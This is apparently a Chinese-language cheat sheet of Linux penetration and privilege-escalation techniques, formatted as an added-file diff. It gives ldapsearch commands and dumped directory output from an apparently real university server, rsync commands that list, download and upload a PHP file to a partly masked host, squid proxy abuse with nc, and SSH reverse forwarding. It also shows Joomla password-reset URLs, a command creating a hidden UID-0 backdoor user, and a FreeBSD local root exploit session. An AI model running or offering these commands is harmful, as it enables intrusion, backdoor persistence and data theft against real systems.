@@ -1,0 +1,249 @@
+liunx 相关提权渗透技巧总结，一、ldap 渗透技巧：
+
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+实战:
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+渗透实战:
+1.返回所有的属性
+ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s sub "objectclass=*"
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+dn: uid=manager,dc=ruc,dc=edu,dc=cn
+uid: manager
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: manager
+cn: manager
+
+dn: uid=superadmin,dc=ruc,dc=edu,dc=cn
+uid: superadmin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: superadmin
+cn: superadmin
+
+dn: uid=admin,dc=ruc,dc=edu,dc=cn
+uid: admin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: admin
+cn: admin
+
+dn: uid=dcp_anonymous,dc=ruc,dc=edu,dc=cn
+uid: dcp_anonymous
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+sn: dcp_anonymous
+cn: dcp_anonymous
+
+2.查看基类
+bash-3.00# ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s base "objectclass=*" |
+
+more
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+3.查找
+bash-3.00# ldapsearch -h 192.168.7.33 -b "" -s base "objectclass=*"
+version: 1
+dn:
+objectClass: top
+namingContexts: dc=ruc,dc=edu,dc=cn
+supportedExtension: 2.16.840.1.113730.3.5.7
+supportedExtension: 2.16.840.1.113730.3.5.8
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 2
+supportedLDAPVersion: 3
+vendorName: Sun Microsystems, Inc.
+vendorVersion: Sun-Java(tm)-System-Directory/6.2
+dataversion: 020090516011411
+netscapemdsuffix: cn=ldap://dc=webA:389
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+
+
+ 
+
+liunx 相关提权渗透技巧总结，二、NFS 渗透技巧：
+
+列举IP：showmount -e ip
+
+
+ 
+
+liunx 相关提权渗透技巧总结，三、rsync渗透技巧：
+
+1.查看rsync服务器上的列表：
+
+rsync 210.51.X.X::
+finance
+img_finance
+auto
+img_auto
+html_cms
+img_cms
+ent_cms
+ent_img
+ceshi
+res_img
+res_img_c2
+chip
+chip_c2
+ent_icms
+games
+gamesimg
+media
+mediaimg
+fashion
+res-fashion
+res-fo
+taobao-home
+res-taobao-home
+house
+res-house
+res-home
+res-edu
+res-ent
+res-labs
+res-news
+res-phtv
+res-media
+home
+edu
+news
+res-book
+
+看相应的下级目录(注意一定要在目录后面添加上/)
+
+rsync 210.51.X.X::htdocs_app/
+rsync 210.51.X.X::auto/
+rsync 210.51.X.X::edu/
+
+2.下载rsync服务器上的配置文件
+rsync -avz 210.51.X.X::htdocs_app/ /tmp/app/
+
+3.向上更新rsync文件(成功上传,不会覆盖)
+rsync -avz nothack.php 210.51.X.X::htdocs_app/warn/
+http://app.finance.xxx.com/warn/nothack.txt
+
+
+ 
+
+liunx 相关提权渗透技巧总结，四、squid渗透技巧：
+
+nc -vv baidu.com 80
+GET HTTP://www.sina.com / HTTP/1.0
+GET HTTP://WWW.sina.com:22 / HTTP/1.0
+
+
+ 
+
+liunx 相关提权渗透技巧总结，五、SSH端口转发：
+
+ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip
+
+
+ 
+
+liunx 相关提权渗透技巧总结，六、joomla渗透小技巧：
+
+确定版本：
+
+index.php?option=com_content&view=article&id=30:what-languages-are-supported-by-joomla-15&catid=32:languages&Itemid=47
+
+重新设置密码：
+
+index.php?option=com_user&view=reset&layout=confirm
+
+
+ 
+
+liunx 相关提权渗透技巧总结，七、Linux添加UID为0的root用户：
+
+useradd -o -u 0 nothack
+
+
+ 
+
+liunx 相关提权渗透技巧总结，八、freebsd本地提权：
+
+[argp@julius ~]$ uname -rsi
+* freebsd 7.3-RELEASE GENERIC
+* [argp@julius ~]$ sysctl vfs.usermount
+* vfs.usermount: 1
+* [argp@julius ~]$ id
+* uid=1001(argp) gid=1001(argp) groups=1001(argp)
+* [argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex
+* [argp@julius ~]$ ./nfs_mount_ex
+*
+calling nmount()
+
+
+ 
+
+tar 文件夹打包：
+
+1、tar打包：
+
+tar -cvf /home/public_html/*.tar /home/public_html/--exclude=排除文件*.gif  排除目录 /xx/xx/*
+alzip打包(韩国) alzip -a D:\WEB\ d:\web\*.rar
+{
+注：
+关于tar的打包方式,linux不以扩展名来决定文件类型。
+若压缩的话tar -ztf *.tar.gz   查看压缩包里内容     tar -zxf *.tar.gz 解压
+那么用这条比较好 tar -czf /home/public_html/*.tar.gz /home/public_html/--exclude= 排除文件*.gif   排除目录 /xx/xx/*
+} 
+
+提权先执行systeminfo
+token 漏洞补丁号 KB956572
+Churrasco          kb952004
+命令行RAR打包~~·
+rar a -k -r -s -m3 c:\1.rar c:\folder
